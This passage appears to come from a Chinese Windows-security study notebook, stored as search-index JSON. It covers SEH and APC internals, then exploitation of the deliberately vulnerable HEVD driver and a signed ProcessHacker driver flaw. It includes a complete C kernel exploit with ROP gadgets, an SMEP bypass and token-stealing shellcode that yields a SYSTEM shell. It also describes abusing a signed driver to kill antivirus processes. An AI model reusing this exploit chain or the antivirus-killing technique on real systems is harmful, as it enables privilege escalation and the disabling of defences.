//EXCEPTION_CONTINUE_SEARCH\u7684\u8fd4\u56de\u503c\u5411SEH\u53d1\u51fa\u4fe1\u53f7\uff0c\u8ba9\u5b83\u7ee7\u7eed\u5728\u5176\u4ed6\u5730\u65b9\u641c\u7d22\u5904\u7406\u7a0b\u5e8f //\u5f53\u5904\u7406\u7a0b\u5e8f\u8fd4\u56deExceptionContinueSearch\u65f6\uff0c\u8fd9\u610f\u5473\u7740\u5904\u7406\u7a0b\u5e8f\u5bf9\u5f53\u524d\u5f02\u5e38\u7684\u6062\u590d\u4e0d\u611f\u5174\u8da3\u3002\u56e0\u6b64\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5c06\u8f6c\u5230\u4e0b\u4e00\u4e2a_EXCEPTION_REGISTRATION_RECORD\u5e76\u6267\u884c\u5176\u5904\u7406\u7a0b\u5e8f\u3002 //\u5982\u679c\u6240\u6709\u5904\u7406\u7a0b\u5e8f\u4e0d\u4f1a\u7ba1\u7406\u5f53\u524d\u5f02\u5e38,\u64cd\u4f5c\u7cfb\u7edf\u5c06\u8c03\u7528\u5f53\u524d\u672a\u5904\u7406\u7684\u5f02\u5e38\u8fc7\u6ee4\u5668\u3002\u5f00\u53d1\u4eba\u5458\u53ef\u80fd\u4f1a\u8c03\u7528UnhandledExceptionFilter()API\u5b89\u88c5\u81ea\u5b9a\u4e49\u8fc7\u6ee4\u5668\u3002\u4f46\u662f,\u8bf7\u6ce8\u610f,\u672a\u5904\u7406\u7684\u5f02\u5e38\u8fc7\u6ee4\u5668()\u5e76\u4e0d\u662f\u524d\u9762\u63d0\u5230\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u5217\u8868\u7684\u4e00\u90e8\u5206\u3002\u4e5f\u5c31\u662f\u8bf4,\u6ca1\u6709_exception _register _register _record\u7ed3\u6784,\u5b83\u5c06\u6307\u5411\u8fd9\u4e2a\u51fd\u6570 EXCEPTION_CONTINUE_EXECUTION //EXCEPTION_CONTINUE_EXECUTION\u7684\u8fd4\u56de\u503c\u5411SEH\u53d1\u51fa\u4fe1\u53f7\uff0c\u8ba9\u5b83\u91cd\u65b0\u6267\u884c\u5bfc\u81f4\u5f02\u5e38\u7684\u76f8\u540c\u4ee3\u7801(\u5728\u6211\u4eec\u7684\u793a\u4f8b\u4e2d\uff0c\u8fd9\u662f\u9664\u6cd5\u4ee3\u7801)\u3002 SEH\u662f\u57fa\u4e8e\u7ebf\u7a0b\u7684 TIB\u4e2d\u7684\u7ed3\u6784 typedef struct _NT_TIB { struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; //\u7b2c\u4e00\u4e2a\u6210\u5458\u6307\u5411_EXCEPTION_REGISTRATION_RECORD\u7ed3\u6784\u7684\u6307\u9488 PVOID StackBase; PVOID StackLimit; PVOID SubSystemTib; #if defined(_MSC_EXTENSIONS) union { PVOID FiberData; DWORD Version; }; #else PVOID FiberData; #endif PVOID ArbitraryUserPointer; struct _NT_TIB *Self; } NT_TIB; typedef NT_TIB *PNT_TIB; _EXCEPTION_REGISTRATION_RECORD \u7684\u4e00\u4e2a\u6210\u5458\u662f\u4e0b\u4e00\u4e2a _EXCEPTION_REGISTRATION_RECORD \u7684\u6307\u9488\u3002 _EXCEPTION_REGISTRATION_RECORD \u662f\u5f02\u5e38\u5904\u7406\u7684\u94fe\u8868 typedef struct _EXCEPTION_REGISTRATION_RECORD { struct _EXCEPTION_REGISTRATION_RECORD *Next; PEXCEPTION_ROUTINE Handler; } EXCEPTION_REGISTRATION_RECORD; \u5f53\u53d1\u751f\u5f02\u5e38\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u67e5\u770b\u53d1\u751f\u6545\u969c\u7684\u7ebf\u7a0b\u7684TIB\uff0c\u5e76\u68c0\u7d22\u4e00\u4e2a\u6307\u5411TIB\u4e2d\u5305\u542b\u7684_EXCEPTION_REGISTRATION_RECORD\u7ed3\u6784\u7684\u6307\u9488\u3002\u7136\u540e\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5bfc\u822a\u5230EXCEPTION_ROUTINE\u4f8b\u7a0b\u7684\u94fe\u8868\uff0c\u5e76\u786e\u5b9a\u8fd9\u4e9b\u4f8b\u7a0b\u4e2d\u662f\u5426\u6709\u4efb\u4f55\u4f8b\u7a0b\u5c06\u5904\u7406\u5f02\u5e38","title":"SEH"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#apc","text":"APC(\u5f02\u6b65\u8fc7\u7a0b\u8c03\u7528)\u662f\u4e00\u79cd\u673a\u5236\uff0c\u53ef\u4ee5\u5728Windows\u4e2d\u7528\u4e8e\u5728\u7279\u5b9a\u7ebf\u7a0b\u7684\u4e0a\u4e0b\u6587\u4e2d\u6392\u961f\u5b8c\u6210\u4f5c\u4e1a\u3002 \u5f53\u8c03\u7528\u5f02\u6b65RPC\u65b9\u6cd5\u65f6\uff0c\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2aAPC\u4f8b\u7a0b\u7684\u5730\u5740\uff0c\u8be5\u4f8b\u7a0b\u5c06\u5728RPC\u65b9\u6cd5\u5b8c\u6210\u65f6\u6267\u884c\u3002 \u7528\u6237\u6a21\u5f0f\u4e0b\u7684\u4e24\u79cdAPC - \u7528\u6237APC:\u666e\u901a\u7c7b\u578b\u7684\u7528\u6237APC\uff0c\u4ec5\u5728\u7ebf\u7a0b\u5904\u4e8eAlertable\u72b6\u6001\u65f6\u8fd0\u884c - \u7279\u6b8a\u7528\u6237APC: RS5(windows10 October 2018)\u4e2d\u6dfb\u52a0\u7684\u4e00\u79cd\u76f8\u5bf9\u8f83\u65b0\u7684APC\u7c7b\u578b\uff0c\u5f3a\u5236\u7ebf\u7a0b\u8fdb\u5165Alertable\u3002(MS\u5c1a\u672a\u8bc1\u5b9e) \u7528\u6237\u6a21\u5f0f\u4e0b\uff0c\u53ea\u6709\u5f53\u7ebf\u7a0b\u5904\u4e8e Alertable \u3001 NtTestAlert(\u6d4b\u8bd5) \u72b6\u6001\u65f6\uff0c\u624d\u4f1a\u89e6\u53d1APC\uff0c\u4f7f\u7528APC\u6ce8\u5165\uff0c\u9700\u8981\u8ba9\u8fdb\u7a0b\u5904\u4e8e\u4ee5\u4e0a\u72b6\u6001\u3002 \u7279\u6b8a\u7528\u6237APC\u4f7f\u7528 NtQueueApcThreadEx \u3001 NtQueueApcThreadEx2","title":"APC"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_39","text":"","title":"\u5185\u6838\u5b66\u4e60"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#hevd","text":"\u901a\u8fc7\u8f93\u5165\u8f93\u51fa\u63a7\u5236 \uff08IOCTL\uff09 \u8bbf\u95ee\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u3002 \u4f7f\u7528 DeviceIoControl() \u51fd\u6570\u5411\u9a71\u52a8\u5bf9\u8c61\u53d1\u9001\u6d88\u606f\u3002 \u5b89\u88c5\u9a71\u52a8\u3002\u7531\u4e8e\u662f\u65e0\u7b7e\u540d\u7684\uff0cWindows\u4f1a\u963b\u6b62\u542f\u52a8\u9a71\u52a8\uff0c\u9700\u8981\u5728Windows debug\u6a21\u5f0f\u4e0b\u542f\u52a8 sc create HEVD binPath= C:\\Users\\admin\\Desktop\\x64\\HEVD.sys type= kernel sc start HEVD \u9a71\u52a8\u5df2\u52a0\u8f7d","title":"HEVD\u9a71\u52a8\u7ec3\u4e60"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#0x800","text":"\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u4ea7\u751f\u95ee\u9898\u7684\u51fd\u6570\u662f TriggerBufferOverflowStack \u3002 \u627e\u5230\u51fd\u6570\u5730\u5740 \u5728\u51fd\u6570\u8fd4\u56de\u5904\u4e0b\u65ad\u70b9\uff0c\u8fd0\u884cPoc\u89c2\u5bdf\u5bc4\u5b58\u5668\u7684\u503c \u6253\u84dd\u5c4fPoc #include <iostream> #include <string> #include <Windows.h> #define DEVICE_NAME \"\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\" //\u9a71\u52a8\u5bf9\u8c61\u8def\u5f84 //#define DEVICE_NAME \"\\\\Device\\\\HackSysExtremeVulnerableDriver\" #define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) // \u4e00\u4e2a\u5b8f\uff0c\u4ece\u7f16\u53f7\u83b7\u53d6IOCTL #define STACK_OVERFLOW_IOCTL_NUMBER IOCTL(0x800) //\u4ea7\u751f\u95ee\u9898\u7684\u9a71\u52a8IOCTL\u7f16\u53f70x800 using namespace std; HANDLE get_handle() { HANDLE h = CreateFileA(DEVICE_NAME, FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL); //CreateFileA \u6253\u5f00\u9a71\u52a8\u5bf9\u8c61\u8fd4\u56de\u53e5\u67c4 if (h == INVALID_HANDLE_VALUE) { printf(\"Failed to get handle =(\\n\"); return NULL; } else { printf(\"Success to get handle,0x%x\",h); } return h; } //get_handle\u51fd\u6570\u4ece\u9a71\u52a8\u5bf9\u8c61\u8def\u5f84\u4e2d\u83b7\u53d6\u53e5\u67c4 void do_buffer_overflow(HANDLE h) { SIZE_T in_buffer_size = 0x1000; PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size); //\u5206\u914d\u5806\u7a7a\u95f4 memset((char*)in_buffer, 'A', in_buffer_size); //\u5f80\u5806\u4e2d\u5199\u51650x1000\u4e2aA printf(\"Sending buffer.\\n\"); bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL); //\u4f7f\u7528DeviceIoControl()\u5f80\u6307\u5b9a\u7f16\u53f7\u7684\u9a71\u52a8\u5bf9\u8c61\u53d1\u9001\u6570\u636e if (!result) { printf(\"IOCTL Failed: %X\\n\", GetLastError()); } HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer); } int main() { HANDLE h = get_handle(); do_buffer_overflow(h); //std::cout << \"Hello World!\\n\"; } \u89c2\u5bdf\u8fd0\u884cPoc\u540e\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u591a\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u88ab\u8986\u76d6\uff0crsp\u5904\u7684\u4ee3\u7801\u88ab\u8986\u76d6 \u84dd\u5c4f \u6ca1\u6709\u6ea2\u51fa\u5230rsp\uff0c\u800c\u662f\u6ea2\u51fa\u5230rsp\u7684\u5730\u5740 \u5c1d\u8bd5\u627e\u51fa\u6ea2\u51fa\u4f4d\u7f6e \u67e5\u770brsp\u5730\u5740\u7684\u503c\u5df2\u7ecf\u88ab\u8986\u76d6 1: kd> d fffff88b53f177b8 fffff88b`53f177b8 30 43 72 31 43 72 32 43-72 33 43 72 34 43 72 35 0Cr1Cr2Cr3Cr4Cr5 fffff88b`53f177c8 43 72 36 43 72 37 43 72-38 43 72 39 00 00 00 00 Cr6Cr7Cr8Cr9.... fffff88b`53f177d8 18 00 00 00 00 00 00 00-01 00 00 00 00 00 00 00 ................ fffff88b`53f177e8 53 52 42 85 04 f8 ff ff-10 15 5b 6c 85 a4 ff 7f SRB.......[l.... fffff88b`53f177f8 ff ff ff ff 00 00 00 00-d0 82 42 85 04 f8 ff ff ..........B..... fffff88b`53f17808 03 20 22 00 00 00 00 00-c0 70 5b 6c 85 a4 ff ff . \"......p[l.... fffff88b`53f17818 79 8f 03 80 04 f8 ff ff-c0 42 52 6b 85 a4 ff ff y........BRk.... fffff88b`53f17828 02 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ \u250c\u2500\u2500(root\ud83d\udc80kali)-[~] \u2514\u2500# msf-pattern_offset -q 31724330 [*] Exact match at offset 2072 \u7531\u6b64\u53ef\u4ee5\u77e5\u9053\u6ea2\u51fa\u70b9\u57282072\u4e2a\u5b57\u7b26\u540e\u3002 SMEP\u7684\u5e72\u6270 Supervisor Mode Execition Prevention\uff08SMEP\uff09\u662f\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u7684\u4e00\u79cd\u5b89\u5168\u673a\u5236\uff0c\u4e0d\u5141\u8bb8\u5728\u67d0\u4e9b\u5185\u5b58\u7a7a\u95f4\u6267\u884c\u4ee3\u7801\uff0c\u5426\u5219\u4f1a\u76f4\u63a5\u84dd\u5c4f\u3002 \u5982\u4f55\u7ed5\u8fc7 - ROP\u7ed5\u8fc7 - KPTI\u7ed5\u8fc7 \u5982\u679c\u7cfb\u7edf\u542f\u7528\u4e86 KPTI\uff0c\u5219\u6076\u610f\u4ee3\u7801\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee\u5185\u6838\u5185\u5b58\u3002\u4f46\u662f\uff0c\u6076\u610f\u4ee3\u7801\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u6216\u5176\u4ed6\u653b\u51fb\u65b9\u5f0f\u4fee\u6539\u5185\u6838\u5185\u5b58\u6620\u5c04\u8868\u3002\u5982\u679c\u6076\u610f\u4ee3\u7801\u6210\u529f\u4fee\u6539\u4e86\u5185\u6838\u5185\u5b58\u6620\u5c04\u8868\uff0c\u5219\u6076\u610f\u4ee3\u7801\u4ecd\u7136\u53ef\u4ee5\u8bbf\u95ee\u5185\u6838\u5185\u5b58 \u6d41\u7a0b - \u4f7f\u7528 ExAllocatePoolWithTag() \u5206\u914d\u53ef\u6267\u884c\u7684\u4e0d\u53ef\u5206\u9875\u5185\u5b58\u6c60 - \u4f7f\u7528 RtlCopyMemory \u4ece\u7528\u6237\u6a21\u5f0f\u590d\u5236shellcode \u9700\u8981\u4ecentoskrnl\u83b7\u53d6\u51fd\u6570\u5730\u5740\u624d\u53ef\u4f7f\u7528\u4e24\u4e2a\u51fd\u6570 - \u91cd\u5b9a\u5411\u6267\u884c\u6d41 \u4e3a\u4e86\u4ece\u968f\u673a\u5730\u5740\u7a7a\u95f4\u4e2d\u83b7\u53d6\u51fd\u6570\u7684\u5730\u5740\uff0c\u9700\u8981\u901a\u8fc7Psapi\u6765\u679a\u4e3e\u6307\u5b9a\u9a71\u52a8\u7684\u955c\u50cf\u57fa\u5740 #include <Windows.h> #include <Psapi.h> ... unsigned long long get_kernel_base_addr() { LPVOID drivers[1024]; DWORD cbNeeded; EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded); return (unsigned long long)drivers[0]; } \u901a\u8fc7\u51fd\u6570\u540d\u79f0\u83b7\u53d6\u8be6\u7ec6\u5730\u5740 PVOID get_kernel_symbol_addr(const char *symbol) { PVOID kernelBaseAddr; HMODULE userKernelHandle; PCHAR functionAddress; unsigned long long offset; kernelBaseAddr = (PVOID)get_kernel_base_addr(); // \u901a\u8fc7get_kernel_base_addr\u83b7\u53d6\u955c\u50cf\u57fa\u5740 userKernelHandle = LoadLibraryA(\"C:\\\\Windows\\\\System32\\\\ntoskrnl.exe\"); // \u83b7\u53d6ntoskrnl\u53e5\u67c4 if (userKernelHandle == INVALID_HANDLE_VALUE) { return NULL; } functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol); // \u6839\u636e\u7b26\u53f7\u540d\u79f0\uff08\u51fd\u6570\u540d\u79f0\uff09\u83b7\u53d6\u5730\u5740 if (functionAddress == NULL) { return NULL; } offset = functionAddress - ((PCHAR)userKernelHandle); // \u51fd\u6570\u5730\u5740-ntoskrnl\u53e5\u67c4\u521d\u59cb\u5730\u5740 = \u51fd\u6570\u504f\u79fb\u91cf return (PVOID)(((PCHAR)kernelBaseAddr) + offset); // \u8fd4\u56de\u5f53\u524d\u5185\u5b58\u4e2d\u7684\u51fd\u6570\u5b9e\u9645\u5730\u5740\uff0c\u5f53\u524d\u955c\u50cf\u57fa\u5740+\u51fd\u6570\u504f\u79fb\u91cf } exp\u4ee3\u7801\uff0c\u63d0\u6743 #include <iostream> #include <string> #include <Windows.h> #include <Psapi.h> // Name of the device #define DEVICE_NAME \"\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\" #define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) //\u5b9a\u4e49ROP\u6307\u4ee4 unsigned long long g_add_rsp_20h_ret = 0xa155de; unsigned long long g_pop_rdi_pop_r14_pop_rbx_ret = 0x20a518; unsigned long long g_xor_ecx_ecx_mov_rax_rcx_ret = 0x38cf53; unsigned long long g_pop_rdx_ret = 0x416748; unsigned long long g_push_rax_pop_rbx_ret = 0x20a263; unsigned long long g_push_rax_pop_r13_ret = 0x5af724; unsigned long long g_xchg_r8_r13_ret = 0x2c0da6; unsigned long long g_mov_rcx_r8_mov_rax_rcx_ret = 0x93ac7a; unsigned long long g_pop_r8_ret = 0x2017f1; unsigned long long g_jmp_rbx = 0x408aa2; unsigned long long kernel_ExAllocatePoolWithTag; unsigned long long kernel_sysret = 0xa13dc0; unsigned long long kernel_memcpy; DWORD pid; typedef struct sSepTokenPrivileges { UINT8 present; UINT8 enabled; UINT8 enabled_by_default; } SEP_TOKEN_PRIVILEGES; typedef NTSTATUS(*_PsLookupProcessByProcessId)(IN HANDLE, OUT PVOID*); _PsLookupProcessByProcessId kernel_PsLookupProcessByProcessId; typedef PVOID(*_PsReferencePrimaryToken)(PVOID); _PsReferencePrimaryToken kernel_PsReferencePrimaryToken; // \u679a\u4e3e\u9a71\u52a8\u955c\u50cf\u57fa\u5740 unsigned long long get_kernel_base_addr() { LPVOID drivers[1024]; DWORD cbNeeded; EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded); return (unsigned long long)drivers[0]; } // \u6253\u5f00\u9a71\u52a8\u5bf9\u8c61\uff0c\u83b7\u53d6\u9a71\u52a8\u53e5\u67c4 HANDLE get_handle() { HANDLE h = CreateFileA(DEVICE_NAME, FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL); if (h == INVALID_HANDLE_VALUE) { printf(\"Failed to get handle =(\\n\"); return NULL; } return h; } // \u590d\u5236ROP payload void add_to_payload(char* in_buffer, SIZE_T* offset, unsigned long long* data, SIZE_T size) { memcpy(in_buffer + *offset, data, size); printf(\"Wrote %lx to offset %u\\n\", *data, *offset); *offset += size; } //\u83b7\u53d6\u51fd\u6570\u7684\u5185\u5b58\u5730\u5740 PVOID get_kernel_symbol_addr(const char* symbol) { PVOID kernelBaseAddr; HMODULE userKernelHandle; PCHAR functionAddress; unsigned long long offset; kernelBaseAddr = (PVOID)get_kernel_base_addr(); // Loads kernel base address userKernelHandle = LoadLibraryA(\"C:\\\\Windows\\\\System32\\\\ntoskrnl.exe\"); // Gets kernel binary if (userKernelHandle == INVALID_HANDLE_VALUE) { return NULL; } functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol); // Finds given symbol if (functionAddress == NULL) { // Could not find symbol return NULL; } offset = functionAddress - ((PCHAR)userKernelHandle); // Subtracts the loaded binary's base address from the found address. This way, we will find the offset of the symbol for base address 0. return (PVOID)(((PCHAR)kernelBaseAddr) + offset); // Adds the offset to the leaked base address. } void adjust_offsets() { unsigned long long kernel_base_addr = get_kernel_base_addr(); g_xor_ecx_ecx_mov_rax_rcx_ret += kernel_base_addr; g_pop_rdi_pop_r14_pop_rbx_ret += kernel_base_addr; g_add_rsp_20h_ret += kernel_base_addr; g_pop_rdx_ret += kernel_base_addr; g_push_rax_pop_rbx_ret += kernel_base_addr; g_push_rax_pop_r13_ret += kernel_base_addr; g_xchg_r8_r13_ret += kernel_base_addr; g_mov_rcx_r8_mov_rax_rcx_ret += kernel_base_addr; g_pop_r8_ret += kernel_base_addr; g_jmp_rbx += kernel_base_addr; kernel_sysret += kernel_base_addr; kernel_ExAllocatePoolWithTag = (unsigned long long) get_kernel_symbol_addr(\"ExAllocatePoolWithTag\"); kernel_memcpy = (unsigned long long) get_kernel_symbol_addr(\"memcpy\"); kernel_PsLookupProcessByProcessId = (_PsLookupProcessByProcessId)get_kernel_symbol_addr(\"PsLookupProcessByProcessId\"); kernel_PsReferencePrimaryToken = (_PsReferencePrimaryToken)get_kernel_symbol_addr(\"PsReferencePrimaryToken\"); printf(\"Primary token: %xu \\n\", (ULONGLONG)kernel_PsReferencePrimaryToken - kernel_base_addr); printf(\"PsReferencePrimaryToken base addr: %xu\\n\", (ULONGLONG)kernel_PsReferencePrimaryToken - (ULONGLONG)kernel_base_addr); } DWORD spawnCmd() { STARTUPINFO si; PROCESS_INFORMATION pi; wchar_t cmd[] = L\"C:\\\\Windows\\\\System32\\\\cmd.exe\"; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(&pi, sizeof(pi)); // Start the child process. if (!CreateProcessW(NULL, // No module name (use command line) cmd, // Command line NULL, // Process handle not inheritable NULL, // Thread handle not inheritable FALSE, // Set handle inheritance to FALSE CREATE_NEW_CONSOLE, // No creation flags NULL, // Use parent's environment block NULL, // Use parent's starting directory &si, // Pointer to STARTUPINFO structure &pi) // Pointer to PROCESS_INFORMATION structure ) { printf(\"CreateProcess failed (%d).\\n\", GetLastError()); return -1; } return pi.dwProcessId; } //\u6267\u884cROP\u4ee3\u7801\u540e\u8fd4\u56de\u7528\u6237\u7a7a\u95f4\u7684shellcode\uff0c\u5426\u5219\u7cfb\u7edf\u4f1a\u84dd\u5c4f char* generate_shellcode() { char* shellcode = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x4e + 11); memcpy(shellcode, \"\\x48\\xc7\\xc1\\x78\\x56\\x34\\x12\\x48\\x83\\xec\\x08\\x48\\x89\\xe2\\x48\\xbb\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xd3\\x48\\x8b\\x0c\\x24\\x48\\xbb\\x10\\x32\\x34\\x12\\xff\\xff\\xff\\xff\\xff\\xd3\\x48\\x83\\xc0\\x40\\x48\\xb9\\xfc\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x48\\x89\\x08\\x48\\x83\\xc0\\x08\\x48\\x89\\x08\\x48\\x83\\xc0\\x08\\x48\\x89\\x08\\x48\\x83\\xc4\\x08\\x48\\xBB\\xC0\\x0D\\x02\\x1B\\x05\\xF8\\xFF\\xFF\\xFF\\xE3\", 0x4e + 11); memcpy(shellcode + 3, &pid, 4); memcpy(shellcode + 16, &kernel_PsLookupProcessByProcessId, 8); memcpy(shellcode + 32, &kernel_PsReferencePrimaryToken, 8); memcpy(shellcode + 0x4e + 1, &kernel_sysret, 8); return shellcode; } //Does everything void do_buffer_overflow(HANDLE h) { SIZE_T in_buffer_size = 2072 + 8 * 15 + 0x20; PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size); memset((char*)in_buffer, 'A', in_buffer_size); SIZE_T offset = 2072; pid = spawnCmd(); adjust_offsets(); char* shellcode = generate_shellcode(); unsigned long long size_of_copy = 0x4e + 11; add_to_payload((char*)in_buffer, &offset, &g_xor_ecx_ecx_mov_rax_rcx_ret, 8); add_to_payload((char*)in_buffer, &offset, &g_pop_rdx_ret, 8); add_to_payload((char*)in_buffer, &offset, &size_of_copy, 8); add_to_payload((char*)in_buffer, &offset, &kernel_ExAllocatePoolWithTag, 8); add_to_payload((char*)in_buffer, &offset, &g_add_rsp_20h_ret, 8); offset += 0x20; add_to_payload((char*)in_buffer, &offset, &g_push_rax_pop_rbx_ret, 8); add_to_payload((char*)in_buffer, &offset, &g_push_rax_pop_r13_ret, 8); add_to_payload((char*)in_buffer, &offset, &g_xchg_r8_r13_ret, 8); add_to_payload((char*)in_buffer, &offset, &g_mov_rcx_r8_mov_rax_rcx_ret, 8); add_to_payload((char*)in_buffer, &offset, &g_pop_rdx_ret, 8); add_to_payload((char*)in_buffer, &offset, (unsigned long long*)(&shellcode), 8); add_to_payload((char*)in_buffer, &offset, &g_pop_r8_ret, 8); add_to_payload((char*)in_buffer, &offset, &size_of_copy, 8); add_to_payload((char*)in_buffer, &offset, &kernel_memcpy, 8); add_to_payload((char*)in_buffer, &offset, &g_jmp_rbx, 8); system(\"pause\"); printf(\"Sending buffer.\\n\"); bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL); if (!result) { printf(\"IOCTL Failed: %X\\n\", GetLastError()); } //Frees allocated memory HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer); } int main(int argc, char** argv) { do_buffer_overflow(get_handle()); system(\"pause\"); }","title":"0x800 \u7f13\u51b2\u533a\u6ea2\u51fa"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#processhacker","text":"","title":"ProcessHacker\u9a71\u52a8\u6f0f\u6d1e\u5206\u6790"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_40","text":"ProcessHacker\u76842.8.0.0\u7248\u672c\u7684\u9a71\u52a8\u7a0b\u5e8f kprocesshacker.sys \u5b58\u5728\u6f0f\u6d1e\uff0c\u8be5\u9a71\u52a8\u662f\u6570\u5b57\u7b7e\u540d\u7684\uff0c\u5229\u7528\u9a71\u52a8\u6f0f\u6d1e\u53ef\u4ee5\u5728R0\u4e0b\u7ed3\u675f\u8fdb\u7a0b\u3001\u6682\u505c\u8fdb\u7a0b\uff0c\u4e14\u53ef\u7ed3\u675f\u81ea\u6211\u9632\u62a4\u4e0d\u4e25\u683c\u7684\u6740\u6bd2\u8f6f\u4ef6\u3002","title":"\u4ecb\u7ecd"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_41","text":"\u4ee5\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\u5165\u624b\uff0c\u5206\u6790\u6f0f\u6d1e\u70b9\u4ee5\u589e\u5f3a\u77e5\u8bc6\u7406\u89e3\u548c\u8c03\u8bd5\u719f\u7ec3\u5ea6","title":"\u76ee\u7684"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_42","text":"\u5148\u68c0\u9a8c\u4e00\u4e0bProcessHacker\u80fd\u5426\u6740\u706b\u7ed2 \u706b\u7ed2\u76f4\u63a5\u88ab\u6740\u4e86\u4e14\u6ca1\u6709\u91cd\u65b0\u542f\u52a8 \u65e2\u7136\u662f\u7ed3\u675f\u8fdb\u7a0b\uff0c\u53ef\u80fd\u7528\u5230\u4e86 ZwTerminateProcess \u3002 \u4e5f\u6709\u5176\u4ed6\u4f7f\u7528\u975e\u516c\u5f00\u5185\u6838\u51fd\u6570\u7684\u65b9\u6cd5\u6765\u7ed3\u675f\u8fdb\u7a0b\uff0c\u4f46\u4e00\u822c\u6b63\u5e38\u7684\u5de5\u5177\u5e94\u8be5\u4e0d\u4f1a\u90a3\u6837\u505a\u3002 \u4e3a\u4e86\u8bc1\u5b9e\u8fd9\u4e00\u70b9\uff0c\u53ef\u4ee5\u8c03\u8bd5\u4e00\u4e0b\u7ed3\u675f\u8fdb\u7a0b\u64cd\u4f5c\u662f\u5426\u771f\u7684\u8c03\u7528\u4e86 ZwTerminateProcess . \u5728 kprocesshacker \u548c ntdll!ZwTerminateProcess \u5904\u4e0b\u65ad\u70b9\uff0c\u5f53\u4f7f\u7528ProcessHacker\u7ed3\u675f\u8fdb\u7a0b\u65f6\uff0c\u6210\u529f\u65ad\u5728 ZwTerminateProcess \u51fd\u6570\u8c03\u7528\u5904 \u6ca1\u6709\u7b26\u53f7\u8868\uff0c\u9700\u8981\u9759\u6001\u5206\u6790\u51fa\u51fd\u6570\u7684\u4f4d\u7f6e\uff0c\u627e\u51fa\u9a71\u52a8\u4e2d\u51fd\u6570\u504f\u79fb\u91cf. \u7531\u4e8e\u6211\u6ca1\u6709\u627e\u52302.8.0.0\u7248\u672c\u9a71\u52a8\u7684ProcessHacker\u7684\u6587\u4ef6\uff0c\u7528\u7684\u662f\u5176\u4ed6\u7248\u672c\u8fdb\u884c\u8c03\u8bd5\u3002 \u5f53\u6211\u5c1d\u8bd5\u7528\u5176\u4ed6\u7248\u672c\u7684exe\u52a0\u8f7d2.8.0.0\u7684sys\u6587\u4ef6\u65f6\uff0c\u867d\u7136exe\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\uff0c\u4f46\u662f\u7ecf\u8fc7\u8c03\u8bd5\u540e\u53d1\u73b0sys\u6587\u4ef6\u4f3c\u4e4e\u6ca1\u6709\u88ab\u6b63\u786e\u8c03\u7528\uff0c\u56e0\u4e3aProcessHacker\u7528\u7684\u81ea\u5df1\u800c\u4e0d\u662f\u9a71\u52a8\u6765\u8c03\u7528ZwTerminateProcess\u3002\u770b\u6765exe\u548csys\u662f\u914d\u5bf9\u7684 \u4e0b\u65ad\u70b9 bp kprocesshacker+0x68f1 \u6765\u627e\u4e00\u4e0b kprocesshacker.sys \u7ed3\u675f\u8fdb\u7a0b\u7684\u5185\u6838\u7ea7\u522b\u51fd\u6570 